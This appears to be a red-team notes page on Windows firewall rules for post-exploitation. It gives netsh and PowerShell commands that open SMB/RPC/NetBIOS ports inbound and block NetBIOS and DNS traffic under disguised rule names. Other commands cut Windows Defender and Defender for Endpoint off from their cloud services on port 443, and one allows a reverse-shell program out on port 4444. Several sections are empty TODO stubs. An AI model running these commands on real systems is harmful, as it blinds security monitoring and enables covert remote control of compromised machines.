# Add Firewall Rule

## 01 - Usage

### 1.1 - Command Prompt

> [!NOTE] Elevated Privileges is required
> Using `netsh.exe` requires administrative rights when adding firewall rules.

You can remotely add a firewall rule communicating through NETBIOS.

```
C:\> netsh.exe [-r <IP>] advfirewall firewall add rule name="<rule_name>" dir=<in | out> action=<allow | block | bypass> protocol=<any | tcp | udp | icmpv4 | icmpv6> localport=<PORT>
```

### 1.2 - PowerShell

```
PS C:\> New-NetFirewallRule -DisplayName "<rule_name>" -Direction <Inbound | Outbound> -LocalPort <PORT> -Action <NotConfigured | Allow | Block> -Protocol <TCP | UDP | ICMPV4 | ICMPV6>
```

## 02 - Scenarios

### 2.1 - Allow Incoming Ports

#### 2.1.1 - Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" dir=in action=allow protocol=TCP localport=445
```

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" dir=in action=allow protocol=TCP localport=135
```

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" dir=in action=allow protocol=TCP localport=139
```

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" dir=in action=allow protocol=TCP localport=138
```

#### 2.1.2 - PowerShell

```

```

### 2.1 - Block Outbound Packets

#### 2.1.1 - Command Prompt

Limit certain UDP outbound packets for NETBIOS fingerprinting

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" protocol=udp dir=out localport=137 action=block
```

Limit certain UDP outbound packets for DNS lookup fingerprinting

```
C:\> netsh.exe advfirewall firewall add rule name="<name>" protocol=udp dir=out localport=53 action=block
```

#### 2.1.2 - PowerShell

Limit certain UDP outbound packets for NETBIOS fingerprinting

```
PS C:\> New-NetFirewallRule -DisplayName "Load Balancer" -Direction Outbound -LocalPort 137 -Action Block -Protocol UDP
```

Limit certain UDP outbound packets for DNS lookup fingerprinting

```
PS C:\> New-NetFirewallRule -DisplayName "Endpoint Response Agent" -Direction Outbound -LocalPort 53 -Action Block -Protocol UDP
```

### 2.2 - Block Security Endpoints

#### 2.2.1 - Windows Security

Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Block 443 MsMpEng" dir=outbound protocol=TCP action=block service=WinDefend remoteport=443

C:\> netsh.exe advfirewall firewall show rule name="Block 443 MsMpEng"
```

PowerShell

```powershell
PS C:\> New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block

PS C:\> Get-NetFirewallRule -DisplayName "Block 443 MsMpEng"
```

#### 2.2.2 - Advanced Threat Protection

Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Block 443 SenseCncProxy" dir=outbound program="%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" remoteport=443 protocol=TCP action=block

C:\> netsh.exe advfirewall firewall add rule name="Block 443 MsSense" dir=outbound program="%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" remoteport=443 protocol=TCP action=block
```

PowerShell

```
PS C:\> New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block

PS C:\> New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block
```

#### 2.2.3 - Third Party

TODO: Provide other examples from different endpoints

### 2.3 - Allow programs with incoming/outgoing connection

TODO: Provide examples such as in a restricted network by adding a firewall rule to establish a callback shell connection

#### 2.3.1 - Callback Reverse Shell

TODO: Test this

Command Prompt

```
C:\> netsh.exe advfirewall firewall add rule name="Callback Reverse Shell" profile=domain,private,public remoteport=4444 protocol=tcp enable=yes dir=out program="C:\path\to\shell.exe" action=allow
```

PowerShell

```
PS C:\> New-NetFirewallRule -Name "Callback Reverse Shell" -Profile "Domain,Private,Public" -Protocol TCP -Enabled True -Direction Outbound -RemotePort 4444 -Program "C:\path\to\shell.exe" -Action Allow
```

#### 2.3.2 - Callback Bind Shell

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Windows/Host/0xE - Networking Configuration/Firewalls/Living off the Land]]

- [[Firewall Rule Names Examples]]

### Red Team Recipe

- [RedTeamRecipe: Registry Attack Vectors](https://blog.redteamguides.com/registry-attack-vectorsrtc0018)

### Bhabesh

- [Bhabesh: Detect Addition of New Firewall Rules in Defender Firewall](https://bhabeshraj.com/post/detect-addition-of-new-firewall-rules-in-defender-firewall/)

### Ivan

- [Ivan: Installing Reverse Shell Backdoors on Windows Systems](https://ivanitlearning.wordpress.com/2019/06/09/installing-reverse-shell-backdoors-on-windows-systems/)

### Soren Fritzboger

- [Soren Fritzboger: Silencing Microsoft Defender for Endpoint using firewall rules](https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18)